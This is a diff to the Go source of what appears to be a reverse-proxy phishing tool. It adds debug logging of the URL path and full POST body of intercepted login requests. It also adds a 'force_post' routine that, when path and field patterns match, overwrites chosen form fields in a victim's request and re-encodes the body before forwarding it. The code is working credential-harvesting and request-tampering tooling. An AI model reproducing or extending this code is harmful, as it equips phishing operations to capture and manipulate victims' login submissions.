@@ -227,7 +227,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if contentType == "application/json" {
 
 							json, _ := ioutil.ReadAll(req.Body)
-							log.Debug("POST %s", json)
+							log.Debug("POST: %s", req.URL.Path)
+							log.Debug("POST body = %s", json)
 
 							if pl.username.tp == "json" {
 								um := pl.username.search.FindStringSubmatch(string(json))
@@ -267,7 +268,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						} else {
 
 							if req.ParseForm() == nil {
-								for k, v := range req.Form {
+								log.Debug("POST: %s", req.URL.Path)
+								for k, v := range req.PostForm {
 									log.Debug("POST %s = %s", k, v[0])
 									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
 										um := pl.username.search.FindStringSubmatch(v[0])
@@ -302,6 +304,43 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}
 									}
 								}
+
+								// force posts
+								for _, fp := range pl.forcePost {
+									if fp.path.MatchString(req.URL.Path) {
+										log.Debug("force_post: url matched: %s", req.URL.Path)
+										ok_search := false
+										if len(fp.search) > 0 {
+											k_matched := len(fp.search)
+											for _, fp_s := range fp.search {
+												for k, v := range req.PostForm {
+													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
+														if k_matched > 0 {
+															k_matched -= 1
+														}
+														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
+														break
+													}
+												}
+											}
+											if k_matched == 0 {
+												ok_search = true
+											}
+										} else {
+											ok_search = true
+										}
+
+										if ok_search {
+											for _, fp_f := range fp.force {
+												req.PostForm.Set(fp_f.key, fp_f.value)
+											}
+											body = []byte(req.PostForm.Encode())
+											req.ContentLength = int64(len(body))
+											log.Debug("force_post: body: %s len:%d", body, len(body))
+										}
+									}
+								}
+
 							}
 
 						}
